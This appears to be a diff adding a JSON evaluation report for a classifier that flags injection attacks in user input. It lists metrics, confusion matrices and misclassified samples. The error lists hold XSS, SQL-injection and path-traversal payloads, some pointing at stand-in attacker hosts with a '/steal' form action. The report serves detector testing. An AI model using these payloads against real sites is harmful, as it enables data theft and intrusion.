@@ -1,0 +1,1123 @@
+{
+  "version": "v1",
+  "trained_rows": 7000,
+  "held_out_families": [
+    "cmd:%24%28:misc",
+    "cmd:%24%28:obf",
+    "cmd:%24%28:rev",
+    "cmd:%250a:cred",
+    "cmd:%250a:rev",
+    "cmd:%26%26:obf",
+    "cmd:%3B:cred",
+    "cmd:%60:dl",
+    "cmd:%7C%7C:cred",
+    "cmd:%7C%7C:dl",
+    "cmd:%7C:cred",
+    "cmd:%7C:obf",
+    "normal:address",
+    "normal:email",
+    "normal:host",
+    "normal:ip",
+    "normal:json",
+    "normal:price",
+    "normal:search",
+    "normal:username",
+    "sqli:error",
+    "sqli:tautology",
+    "trav:tricks",
+    "xss:tags",
+    "xss:url"
+  ],
+  "family_holdout": {
+    "n": 1907,
+    "fast_path": true,
+    "attack_recall_at_0.5": 0.835820895522388,
+    "attack_recall_at_0.8": 0.7454394693200663,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.0,
+    "macro_f1": 0.8590166021505846,
+    "per_class_f1": {
+      "normal": 0.8559218559218559,
+      "cmd_injection": 0.9219858156028369,
+      "sqli": 0.9604743083003953,
+      "xss": 0.5567010309278351,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          701,
+          0,
+          0,
+          0,
+          0
+        ],
+        [
+          1,
+          260,
+          0,
+          0,
+          0
+        ],
+        [
+          20,
+          0,
+          243,
+          0,
+          0
+        ],
+        [
+          215,
+          43,
+          0,
+          162,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          262
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 732,
+        "mean_risk": 0.017,
+        "attack_rate": 0.102
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 111,
+        "mean_risk": 0.304,
+        "attack_rate": 0.604
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 123,
+        "mean_risk": 0.502,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 42,
+        "mean_risk": 0.708,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 899,
+        "mean_risk": 0.969,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": [
+      {
+        "value": "37%3Cbase%20href%3D%2F%2Fevil.test%2F%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.307
+      },
+      {
+        "value": "<object  data=//evil.test/x.swf>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.451
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "<style>body{background:url(//192.0.2.10/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "priya.kdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.12
+      },
+      {
+        "value": "%3Cform%20action%3D%2F%2F185.220.101.4%2Fsteal%3E%3Cinput%20name%3Dp%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.403
+      },
+      {
+        "value": "filedata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.08
+      },
+      {
+        "value": "<meta http-equiv=refresh content=0;url=//attacker.example>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.678
+      },
+      {
+        "value": "null_8<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.49
+      },
+      {
+        "value": "<style>body{background:url(//45.33.32.156/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "<form action=//192.0.2.10/steal><input name=p>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.403
+      },
+      {
+        "value": "%253Cmeta%2520http-equiv%253Drefresh%2520content%253D0%253Burl%253D%252F%252Fattacker.example%253E",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.678
+      },
+      {
+        "value": "<form action=//attacker.example/steal><input name=p>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.595
+      },
+      {
+        "value": "%253Ciframe%2520src%253D%252F%252Fevil.test%253E%253C%252Fiframe%253E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.513
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "<iframe src=//attacker.example></iframe>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.597
+      },
+      {
+        "value": "<base href=//evil.test/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "<style>body{background:url(//185.220.101.4/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "%3Cbase href%3D//evil.test/%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "%3Cstyle%3Ebody%7Bbackground%3Aurl%28%2F%2Fevil.test%2Fx%29%7D%3C%2Fstyle%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.378
+      },
+      {
+        "value": "admindata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.092
+      },
+      {
+        "value": "<form action=//evil.test/steal><input name=p>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.444
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.079
+      },
+      {
+        "value": "%3Cbase%20href%3D%2F%2Fattacker.example%2F%3E",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.567
+      },
+      {
+        "value": "oRDeR<MEtA hTTP-eqUiv=RefrESh COnTENt=0;uRl=//AttAcKeR.EXamPLE>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.634
+      },
+      {
+        "value": "<base href=//192.0.2.10/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.365
+      },
+      {
+        "value": "%3Clink%20rel%3Dstylesheet%20href%3D%2F%2Fattacker.example%2Fs.css%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.365
+      },
+      {
+        "value": "<embed src=//evil.test/e>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.079
+      },
+      {
+        "value": "Aarav O'Brienadmin' --",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.464
+      },
+      {
+        "value": "<style>body{background:url(//192.0.2.10/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "<form action=//45.33.32.156/steal><input name=p>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.403
+      },
+      {
+        "value": "<style>body{background:url(//evil.test/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.378
+      },
+      {
+        "value": "shipment%2520of%2520meeting%2520leave%2520request%2520notes%253Cobject%2520data%253D%252F%252Fevil.test%252Fx.swf%253E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.122
+      },
+      {
+        "value": "%3Ciframe%20src%3D%2F%2F10.66.0.23%3E%3C%2Fiframe%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.359
+      },
+      {
+        "value": "<style>body{background:url(//attacker.example/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.497
+      }
+    ]
+  },
+  "family_holdout_model_only": {
+    "n": 1907,
+    "fast_path": false,
+    "attack_recall_at_0.5": 0.835820895522388,
+    "attack_recall_at_0.8": 0.7454394693200663,
+    "attack_precision_at_0.8": 0.986827661909989,
+    "normal_fpr_at_0.5": 0.03566333808844508,
+    "macro_f1": 0.8483107664665136,
+    "per_class_f1": {
+      "normal": 0.8396284829721362,
+      "cmd_injection": 0.8904109589041096,
+      "sqli": 0.9548133595284872,
+      "xss": 0.5567010309278351,
+      "path_traversal": 1.0
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          678,
+          20,
+          3,
+          0,
+          0
+        ],
+        [
+          1,
+          260,
+          0,
+          0,
+          0
+        ],
+        [
+          20,
+          0,
+          243,
+          0,
+          0
+        ],
+        [
+          215,
+          43,
+          0,
+          162,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          0,
+          262
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 623,
+        "mean_risk": 0.084,
+        "attack_rate": 0.12
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 176,
+        "mean_risk": 0.288,
+        "attack_rate": 0.381
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 145,
+        "mean_risk": 0.5,
+        "attack_rate": 0.848
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 52,
+        "mean_risk": 0.709,
+        "attack_rate": 0.808
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 911,
+        "mean_risk": 0.968,
+        "attack_rate": 0.987
+      }
+    ],
+    "errors": [
+      {
+        "value": "37%3Cbase%20href%3D%2F%2Fevil.test%2F%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.307
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.84
+      },
+      {
+        "value": "<object  data=//evil.test/x.swf>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.451
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "<style>body{background:url(//192.0.2.10/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "priya.kdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.12
+      },
+      {
+        "value": "%3Cform%20action%3D%2F%2F185.220.101.4%2Fsteal%3E%3Cinput%20name%3Dp%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.403
+      },
+      {
+        "value": "filedata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.08
+      },
+      {
+        "value": "<meta http-equiv=refresh content=0;url=//attacker.example>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.678
+      },
+      {
+        "value": "null_8<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.49
+      },
+      {
+        "value": "<style>body{background:url(//45.33.32.156/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "<form action=//192.0.2.10/steal><input name=p>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.403
+      },
+      {
+        "value": "%253Cmeta%2520http-equiv%253Drefresh%2520content%253D0%253Burl%253D%252F%252Fattacker.example%253E",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.678
+      },
+      {
+        "value": "<form action=//attacker.example/steal><input name=p>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.595
+      },
+      {
+        "value": "root",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.714
+      },
+      {
+        "value": "%253Ciframe%2520src%253D%252F%252Fevil.test%253E%253C%252Fiframe%253E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.513
+      },
+      {
+        "value": "\" OR \"\"=\"",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.523
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.84
+      },
+      {
+        "value": "<iframe src=//attacker.example></iframe>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.597
+      },
+      {
+        "value": "<base href=//evil.test/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "<style>body{background:url(//185.220.101.4/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "%3Cbase href%3D//evil.test/%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "%3Cstyle%3Ebody%7Bbackground%3Aurl%28%2F%2Fevil.test%2Fx%29%7D%3C%2Fstyle%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.378
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.84
+      },
+      {
+        "value": "admindata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.092
+      },
+      {
+        "value": "<form action=//evil.test/steal><input name=p>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.444
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "<object data=//attacker.example/x.swf>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.573
+      },
+      {
+        "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.079
+      },
+      {
+        "value": "%3Cbase%20href%3D%2F%2Fattacker.example%2F%3E",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.567
+      },
+      {
+        "value": "oRDeR<MEtA hTTP-eqUiv=RefrESh COnTENt=0;uRl=//AttAcKeR.EXamPLE>",
+        "label": "xss",
+        "pred": "cmd_injection",
+        "risk": 0.634
+      },
+      {
+        "value": "<base href=//192.0.2.10/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.365
+      },
+      {
+        "value": "%3Clink%20rel%3Dstylesheet%20href%3D%2F%2Fattacker.example%2Fs.css%3E",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.365
+      },
+      {
+        "value": "<embed src=//evil.test/e>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      },
+      {
+        "value": "deploy",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.84
+      },
+      {
+        "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.079
+      },
+      {
+        "value": "Aarav O'Brienadmin' --",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.464
+      },
+      {
+        "value": "<style>body{background:url(//192.0.2.10/x)}</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.342
+      }
+    ]
+  },
+  "hard_set_holdout_model": {
+    "n": 125,
+    "fast_path": true,
+    "attack_recall_at_0.5": 0.9647058823529412,
+    "attack_recall_at_0.8": 0.8588235294117647,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.05,
+    "macro_f1": 0.9460529651800511,
+    "per_class_f1": {
+      "normal": 0.926829268292683,
+      "cmd_injection": 0.9615384615384616,
+      "sqli": 0.975609756097561,
+      "xss": 0.9473684210526315,
+      "path_traversal": 0.918918918918919
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          38,
+          1,
+          1,
+          0,
+          0
+        ],
+        [
+          0,
+          25,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          20,
+          0,
+          0
+        ],
+        [
+          2,
+          0,
+          0,
+          18,
+          0
+        ],
+        [
+          2,
+          1,
+          0,
+          0,
+          17
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 29,
+        "mean_risk": 0.024,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 10,
+        "mean_risk": 0.268,
+        "attack_rate": 0.1
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 7,
+        "mean_risk": 0.514,
+        "attack_rate": 0.714
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 6,
+        "mean_risk": 0.743,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 73,
+        "mean_risk": 0.956,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": [
+      {
+        "value": "Order #4521 -- urgent",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.551
+      },
+      {
+        "value": "a+b=c",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.554
+      },
+      {
+        "value": "<style>@import'//evil.test/x.css';</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.3
+      },
+      {
+        "value": "<base href=//evil.test/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.916
+      },
+      {
+        "value": "file:///c:/windows/win.ini",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.451
+      },
+      {
+        "value": "..\\..\\appsettings.json",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.511
+      }
+    ]
+  },
+  "hard_set_holdout_model_only": {
+    "n": 125,
+    "fast_path": false,
+    "attack_recall_at_0.5": 0.9647058823529412,
+    "attack_recall_at_0.8": 0.8588235294117647,
+    "attack_precision_at_0.8": 1.0,
+    "normal_fpr_at_0.5": 0.1,
+    "macro_f1": 0.9387574001609089,
+    "per_class_f1": {
+      "normal": 0.9135802469135802,
+      "cmd_injection": 0.9615384615384616,
+      "sqli": 0.9523809523809523,
+      "xss": 0.9473684210526315,
+      "path_traversal": 0.918918918918919
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          37,
+          1,
+          2,
+          0,
+          0
+        ],
+        [
+          0,
+          25,
+          0,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          20,
+          0,
+          0
+        ],
+        [
+          2,
+          0,
+          0,
+          18,
+          0
+        ],
+        [
+          2,
+          1,
+          0,
+          0,
+          17
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 19,
+        "mean_risk": 0.085,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 16,
+        "mean_risk": 0.262,
+        "attack_rate": 0.062
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 10,
+        "mean_risk": 0.511,
+        "attack_rate": 0.5
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 7,
+        "mean_risk": 0.724,
+        "attack_rate": 0.857
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 73,
+        "mean_risk": 0.956,
+        "attack_rate": 1.0
+      }
+    ],
+    "errors": [
+      {
+        "value": "union square, san francisco",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.615
+      },
+      {
+        "value": "Order #4521 -- urgent",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.551
+      },
+      {
+        "value": "a+b=c",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.554
+      },
+      {
+        "value": "eval period ends friday",
+        "label": "normal",
+        "pred": "normal",
+        "risk": 0.573
+      },
+      {
+        "value": "<style>@import'//evil.test/x.css';</style>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.3
+      },
+      {
+        "value": "<base href=//evil.test/>",
+        "label": "xss",
+        "pred": "normal",
+        "risk": 0.411
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.916
+      },
+      {
+        "value": "file:///c:/windows/win.ini",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.451
+      },
+      {
+        "value": "..\\..\\appsettings.json",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.511
+      }
+    ]
+  },
+  "hard_set_final_model": {
+    "n": 125,
+    "fast_path": true,
+    "attack_recall_at_0.5": 1.0,
+    "attack_recall_at_0.8": 0.8705882352941177,
+    "attack_precision_at_0.8": 0.9866666666666667,
+    "normal_fpr_at_0.5": 0.075,
+    "macro_f1": 0.954489002328654,
+    "per_class_f1": {
+      "normal": 0.9367088607594937,
+      "cmd_injection": 0.9615384615384616,
+      "sqli": 0.926829268292683,
+      "xss": 1.0,
+      "path_traversal": 0.9473684210526315
+    },
+    "confusion": {
+      "labels": [
+        "normal",
+        "cmd_injection",
+        "sqli",
+        "xss",
+        "path_traversal"
+      ],
+      "matrix": [
+        [
+          37,
+          1,
+          2,
+          0,
+          0
+        ],
+        [
+          0,
+          25,
+          0,
+          0,
+          0
+        ],
+        [
+          1,
+          0,
+          19,
+          0,
+          0
+        ],
+        [
+          0,
+          0,
+          0,
+          20,
+          0
+        ],
+        [
+          1,
+          1,
+          0,
+          0,
+          18
+        ]
+      ]
+    },
+    "calibration": [
+      {
+        "bucket": "0.0-0.2",
+        "n": 31,
+        "mean_risk": 0.031,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.2-0.4",
+        "n": 6,
+        "mean_risk": 0.258,
+        "attack_rate": 0.0
+      },
+      {
+        "bucket": "0.4-0.6",
+        "n": 2,
+        "mean_risk": 0.525,
+        "attack_rate": 1.0
+      },
+      {
+        "bucket": "0.6-0.8",
+        "n": 11,
+        "mean_risk": 0.706,
+        "attack_rate": 0.818
+      },
+      {
+        "bucket": "0.8-1.0",
+        "n": 75,
+        "mean_risk": 0.967,
+        "attack_rate": 0.987
+      }
+    ],
+    "errors": [
+      {
+        "value": "Order #4521 -- urgent",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.888
+      },
+      {
+        "value": "a+b=c",
+        "label": "normal",
+        "pred": "cmd_injection",
+        "risk": 0.68
+      },
+      {
+        "value": "or maybe tomorrow?",
+        "label": "normal",
+        "pred": "sqli",
+        "risk": 0.616
+      },
+      {
+        "value": "1;SELECT pg_sleep(10)",
+        "label": "sqli",
+        "pred": "normal",
+        "risk": 0.531
+      },
+      {
+        "value": "../../../home/deploy/.bash_history",
+        "label": "path_traversal",
+        "pred": "cmd_injection",
+        "risk": 0.876
+      },
+      {
+        "value": "..\\..\\appsettings.json",
+        "label": "path_traversal",
+        "pred": "normal",
+        "risk": 0.519
+      }
+    ]
+  }
+}
